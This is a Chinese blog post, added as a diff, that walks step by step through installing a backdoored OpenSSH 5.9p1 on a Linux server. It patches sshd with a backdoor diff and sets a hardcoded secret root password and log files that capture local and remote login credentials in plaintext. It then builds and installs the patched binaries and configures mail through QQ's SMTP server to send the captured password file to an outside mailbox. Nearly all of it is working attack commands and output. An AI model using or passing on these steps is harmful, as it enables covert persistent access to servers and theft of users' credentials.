@@ -1,0 +1,143 @@
+
+---
+layout: post
+title: 黑客是如何安装后门并窃取服务器密码的
+categories:
+- 今日头条
+tags:
+---
+				上传后门程序：
+
+0x06-openssh-5.9p1.patch.tar.gz #后门补丁程序
+
+openssh-5.9p1.tar.gz #包括了sshd服务端和 客户端。
+
+安装：
+
+解压文件
+
+[root@xinsz08 tmp]# tar zxvf openssh-5.9p1.tar.gz
+
+[root@xinsz08 tmp]# tar -zxvf 0x06-openssh-5.9p1.patch.tar.gz
+
+安装openssh-5.9p1并打补丁：补丁， 用一些文件替换原来的文件。
+
+[root@xinsz08 tmp]# cd openssh-5.9p1.patch/
+
+[root@xinsz08 openssh-5.9p1.patch]# cp sshbd5.9p1.diff ../openssh-5.9p1
+
+[root@xinsz08 openssh-5.9p1.patch]# cd ../openssh-5.9p1
+
+[root@xinsz08 openssh-5.9p1]#patch < sshbd5.9p1.diff #打补丁
+
+![](http://p1.pstatp.com/large/71e0001e719b321dbe2)
+
+注： 使用0x06-openssh-5.9p1.patch.tar.gz #后门补丁包中的sshbd5.9p1.diff文件修改了 sshd和ssh客户相关的文件。
+
+修改劫持root密码文件夹的目录和默认的root后门密码
+
+注： Linux中一个帐号只有一个密码。 比如root帐号，只有一个密码：123456
+
+一个帐号root有两个密码。 一个密码是正常使用的：123456，另一个密码是后门密码： mkinge
+
+[root@xinsz08 openssh-5.9p1]# vim /tmp/openssh-5.9p1/includes.h 
+
+找到：
+
+改：
+
+#define ILOG "/tmp/ilog"  //这是记录本机帐号密码
+
+#define OLOG "/tmp/olog" //这是记录远程帐号密码
+
+#define SECRETPW "apaajaboleh" //你后门密码
+
+#endif /* INCLUDES_H */
+
+为：
+
+177 #define ILOG "/usr/share/ifile"
+
+178 #define OLOG "/usr/share/ofile"
+
+179 #define SECRETPW "mkinge"
+
+安装：安装打了补丁sshd服务，替换原来的sshd服务。
+
+ [root@xinsz08 openssh-5.9p1]# ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
+
+注： 检查系统环境，将软件包安装到/usr目录下。 
+
+--with-pam #支持pam认证
+
+--with-kerberos5 #支持kerberos认证
+
+[root@xinsz08 openssh-5.9p1]# make -j 4 # make编译： 把源代码编译成可执行的二进制文件。 -j 4以4个进程同时编译。 速度快。
+
+[root@xinsz08 openssh-5.9p1]# make install #安装
+
+![](http://p3.pstatp.com/large/723000095acf0810c33)
+
+测试：
+
+当用户再次远程登录后,
+
+[root@xinsz08 ~]# ls /usr/share/ifile
+
+/usr/share/ifile
+
+[root@xinsz08 ~]# cat /usr/share/ifile
+
+user:password -->root:123456
+
+到这里我们密码劫持成功了
+
+测试2：root的后门密码
+
+注： Linux中一个帐号只有一个密码。 比如root帐号，只有一个密码：123456
+
+安装后门程序后：
+
+一个帐号root有两个密码。 一个密码是正常使用的：123456，另一个密码是后门密码： mkinge
+
+
+
+[root@xinsz08 ~]# echo 234567 | passwd --stdin root
+
+[root@xinsz08 openssh-5.9p1]# ssh root@192.168.1.63
+
+root@192.168.1.63's password:mkinge
+
+Last login: Sat Aug 29 10:29:33 2015 from 192.168.1.224
+
+[root@xinsz08 ~]# cat /usr/share/ofile
+
+user:password@host --> root:mkinge@192.168.1.63
+
+注：Linux系统中一个用户名对应一个密码。 一个root帐号对应两个密码。
+
+注：但是所有密码还是在别人的服务器上，怎么把密码整到自己邮箱？
+
+自动发送邮件：这里以QQ的smtp服务器为例
+
+LINUX下通过外部QQ的SMTP发邮件
+
+[root@xinsz08 ~]# vim /etc/mail.rc
+
+set from=1273815479@qq.com smtp=smtp.qq.com
+
+set smtp-auth-user=1273815479 smtp-auth-password= smtp-auth=login
+
+注：
+
+set from=815479@qq.com #指定发件人的邮箱，这里我们就写成和收件人的邮箱一样。
+
+set smtp-auth-user=815479 #写自己发件人的邮箱帐号
+
+smtp-auth-password=123456  #写自己发件人的邮箱密码
+
+测试：
+
+[root@xinsz08 ~]# mail -s "demo title" 1273815479@qq.com < /usr/share/ifile
+
+好了，现在你可以看一下，是否收到了邮件，同时在改几次密码，你会发现无论怎么改密码都会发到你的邮箱里了。
